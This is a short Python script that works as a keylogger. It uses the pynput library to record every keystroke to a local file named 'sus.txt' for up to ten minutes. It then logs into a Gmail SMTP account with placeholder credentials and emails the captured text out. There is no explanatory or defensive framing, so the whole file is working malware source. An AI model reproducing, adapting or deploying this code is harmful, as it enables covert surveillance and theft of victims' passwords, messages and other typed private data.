import smtplib
import os
import pynput
from pynput.keyboard import Key, Listener
from datetime import datetime,timedelta
keys = []

start = datetime.now()
def on_press(key):
    keys.append(key)
    write_file(keys)

try:
    f = open('sus.txt', 'x')
except:
    temp='PLSDONTHIREME'
def write_file(keys):
    f = open('sus.txt', 'r+')
    for key in keys:
        if key == Key.space:
            f.write(' ')
        elif key == Key.enter:
            f.write('\n')
        elif key == Key.backspace:
            f.seek(os.SEEK_CUR-1, 1)
            f.write('*')
        else:
            try:
                print('alphnum {0}'.format(key.char))
                f.write(str(key).replace("'", ""))
            except AttributeError:
                print('special {0}'.format(key))


def on_release(key):
    if datetime.now() > start + timedelta(minutes=10) or len(keys) > 1000:
        return False

with Listener(on_press=on_press,
              on_release=on_release) as listener:

    listener.join()


email = "-email-"
password = "-password-"
message = ""
f = open('sus.txt', 'r+')
for x in f:
    message += x
server = smtplib.SMTP(host="smtp.gmail.com", port=587)
server.starttls()
server.login(email, password)
server.sendmail(email, email, message)
server.quit()
